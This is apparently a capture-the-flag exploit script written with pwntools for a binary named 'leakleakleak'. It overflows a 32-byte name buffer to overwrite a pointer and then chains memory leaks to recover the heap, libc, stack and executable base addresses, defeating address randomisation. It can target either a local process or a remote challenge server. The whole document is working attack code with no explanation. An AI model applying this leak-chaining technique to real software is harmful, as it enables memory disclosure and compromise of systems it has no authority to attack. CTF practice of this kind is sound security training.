#!/usr/bin/python3

from pwn import *

exe = ELF('leakleakleak_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x145C 
                brva 0x1406 
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('702b681.678470.xyz', 31609)
else:
        p = process(exe.path)

payload = b'a'*0x20 + p8(0x10)
sa(b"name? ", payload)   
p.recvuntil(b'a'*0x20)
heap = u64(p.recvuntilb(b'!', drop=True) + b'\0\0') - 0x10 - 0x2600
info("heap " + hex(heap))
sla(b'? (Y/n) ', b'Y')    

payload = b'a'*0x20 + p64(heap + 0x3720)
sa(b"name? ", payload)   
p.recvuntil(b' :3\n')
libc.address = u64(p.recv(6) + b'\0\0') - 0x219ce0
info("libc.address " + hex(libc.address))

payload = b'a'*0x20 + p64(libc.sym.environ)
sa(b"name? ", payload)   
p.recvuntil(b' :3\n')
stack = u64(p.recv(6) + b'\0\0')
info("stack.address " + hex(stack))
sla(b'? (Y/n) ', b'Y')    

payload = b'a'*0x20 + p64(stack - 0x110)
sa(b"name? ", payload)   
p.recvuntil(b' :3\n')
exe.address = u64(p.recv(6) + b'\0\0') - 0x137e
info("exe.address " + hex(exe.address))
GDB()

sla(b'? (Y/n) ', b'Y')    

payload = b'a'*0x20 + p64(exe.address + 0x40c0)
sa(b"name? ", payload)   
p.recvuntil(b' :3\n')
payload = b'a'*0x20 + p64(exe.address + 0x40c0)
sa(b"name? ", payload)   
p.recvuntil(b' :3\n')
# exe.address = u64(p.recv(6) + b'\0\0') - 0x137e
# info("stack.address " + hex(exe.address))
# sla(b'? (Y/n) ', b'Y')    
p.interactive()
